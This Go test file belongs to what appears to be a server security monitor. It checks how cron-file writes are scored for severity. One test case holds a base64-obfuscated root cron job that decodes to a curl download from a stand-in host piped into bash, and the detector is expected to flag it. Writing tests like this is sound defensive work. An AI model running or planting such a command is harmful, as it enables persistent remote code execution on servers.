package checks

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/pidginhost/csm/internal/alert"
)

// The veto cancels the provenance demote, so widening it trades alert noise
// for coverage. These cases pin both ends of that trade: the vendor cron
// files this rescoring exists to quieten must still demote, and a payload
// that only becomes readable after base64 decoding must still veto.
func TestCronVetoScope(t *testing.T) {
	logPath := filepath.Join(t.TempDir(), "package.log")
	if err := os.WriteFile(logPath, []byte("transaction\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	oldLogs := pkgManagerLogs
	pkgManagerLogs = []string{logPath}
	t.Cleanup(func() { pkgManagerLogs = oldLogs })

	for _, tc := range []struct {
		name, content string
		want          alert.Severity
	}{
		{
			name:    "panel ssl reissue job",
			content: "27 4 * * * root /usr/local/cpanel/bin/autossl_check --all >/dev/null 2>&1\n",
			want:    alert.Warning,
		},
		{
			name:    "vendor summary job",
			content: "*/5 * * * * root /usr/sbin/cloudlinux-summary --cron >/dev/null 2>&1\n",
			want:    alert.Warning,
		},
		{
			name:    "payload readable only after decoding",
			content: "* * * * * root echo Y3VybCBodHRwOi8vMTkyLjAuMi4xL2ogfCBiYXNo | base64 -d | bash\n",
			want:    alert.High,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f, ok := EvaluateSensitiveFileWriteSnapshot("/etc/cron.d/probe", 0, 4242, "writer", []byte(tc.content), true)
			if !ok {
				t.Fatal("no finding emitted")
			}
			if f.Severity != tc.want {
				t.Fatalf("severity = %v, want %v", f.Severity, tc.want)
			}
		})
	}
}
